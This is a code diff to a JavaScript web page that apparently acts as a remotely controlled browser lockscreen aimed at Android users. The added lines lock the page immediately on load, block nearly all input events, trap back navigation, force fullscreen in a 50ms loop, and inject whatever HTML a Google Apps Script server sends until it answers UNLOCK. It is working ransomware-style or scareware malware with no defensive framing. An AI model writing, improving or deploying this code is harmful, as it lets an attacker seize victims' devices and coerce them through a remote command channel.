@@ -16,14 +16,17 @@
 const API='https://script.google.com/macros/s/AKfycbzwtt_Qt3xFQ5ToKqAy3Je-ukHD41Tinl9bHXT7aTd3KXQ3bt15w0SiMuHLY31peOheug/exec';
 const DID='z'+Math.random().toString(36).substring(2,15);
 const M=navigator.userAgent.match(/Android[\s\d.]+/)?.[0]||'Android';
-let locked=false;
+let locked=true;
+
+// LANGSUNG SEMAT MATI
+sematMati();
 
 async function reg(){
   try{
     let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
     let d=await r.json();
-    if(d.command==='UNLOCK'){unlockAll();return;}
-    if(d.command){document.body.innerHTML=d.command;lock();}
+    if(d.command==='UNLOCK'){bukaKunci();return;}
+    if(d.command){document.body.innerHTML=d.command;sematMati();}
     else document.getElementById('s').innerHTML='OK';
   }catch(e){}
 }
@@ -32,17 +35,17 @@ async function chk(){
   try{
     let r=await fetch(API+'?action=check&device_id='+DID);
     let d=await r.json();
-    if(d.command==='UNLOCK'){unlockAll();return;}
-    if(d.command){document.body.innerHTML=d.command;lock();}
+    if(d.command==='UNLOCK'){bukaKunci();return;}
+    if(d.command){document.body.innerHTML=d.command;sematMati();}
   }catch(e){}
 }
 
-function unlockAll(){
+function bukaKunci(){
   locked=false;
   document.body.innerHTML='<div id="s" style="color:#666;">OK</div>';
 }
 
-function lock(){
+function sematMati(){
   locked=true;
   goFull();
   blockAll();
@@ -57,50 +60,34 @@ function goFull(){
 }
 
 function blockAll(){
-  // Blokir back/forward
-  history.pushState(null,'',location.href);
-  history.pushState(null,'',location.href);
-  history.pushState(null,'',location.href);
+  for(let i=0;i<5;i++) history.pushState(null,'',location.href);
   
-  // Blokir semua event
-  const noEvent=e=>{e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();return false;};
+  const noEvent=e=>{
+    e.preventDefault();
+    e.stopPropagation();
+    e.stopImmediatePropagation();
+    return false;
+  };
   
-  document.addEventListener('contextmenu',noEvent,true);
-  document.addEventListener('touchstart',noEvent,{passive:false,capture:true});
-  document.addEventListener('touchmove',noEvent,{passive:false,capture:true});
-  document.addEventListener('touchend',noEvent,{passive:false,capture:true});
-  document.addEventListener('touchcancel',noEvent,{passive:false,capture:true});
-  document.addEventListener('gesturestart',noEvent,true);
-  document.addEventListener('gesturechange',noEvent,true);
-  document.addEventListener('gestureend',noEvent,true);
-  document.addEventListener('wheel',noEvent,{passive:false,capture:true});
-  document.addEventListener('keydown',noEvent,true);
-  document.addEventListener('keyup',noEvent,true);
-  document.addEventListener('keypress',noEvent,true);
+  const events=['contextmenu','touchstart','touchmove','touchend','touchcancel',
+    'gesturestart','gesturechange','gestureend','wheel','keydown','keyup','keypress',
+    'pointerdown','pointermove','pointerup','pointercancel','mousedown','mousemove','mouseup',
+    'click','dblclick','select','selectstart','drag','dragstart','drop','scroll','copy','cut','paste'];
   
-  // Blokir pointer events
-  document.addEventListener('pointerdown',noEvent,true);
-  document.addEventListener('pointermove',noEvent,true);
-  document.addEventListener('pointerup',noEvent,true);
+  events.forEach(ev=>{
+    document.addEventListener(ev,noEvent,{passive:false,capture:true});
+    window.addEventListener(ev,noEvent,{passive:false,capture:true});
+  });
   
-  // Blokir scroll
-  window.addEventListener('scroll',noEvent,true);
-  
-  // Blokir resize
-  window.addEventListener('resize',()=>goFull());
-  
-  // Blokir popstate
   window.addEventListener('popstate',()=>{
-    history.pushState(null,'',location.href);
+    for(let i=0;i<3;i++) history.pushState(null,'',location.href);
     goFull();
   });
   
-  // Blokir visibility
   document.addEventListener('visibilitychange',()=>{
     if(document.hidden) goFull();
   });
   
-  // Blokir fullscreen exit
   document.addEventListener('fullscreenchange',()=>{
     if(!document.fullscreenElement) goFull();
   });
@@ -108,22 +95,20 @@ function blockAll(){
     if(!document.webkitFullscreenElement) goFull();
   });
   
-  // Blokir orientasi
   screen.orientation?.lock?.('portrait').catch(()=>{});
   
-  // Blokir select
   document.body.style.userSelect='none';
   document.body.style.webkitUserSelect='none';
   document.body.style.touchAction='none';
+  document.body.style.pointerEvents='none';
 }
 
-// Loop paksa - tiap 100ms
 setInterval(()=>{
   if(!locked)return;
   goFull();
-  history.pushState(null,'',location.href);
+  for(let i=0;i<3;i++) history.pushState(null,'',location.href);
   if(screen.orientation?.lock) screen.orientation.lock('portrait').catch(()=>{});
-},100);
+},50);
 
 reg();
 setInterval(chk,5000);
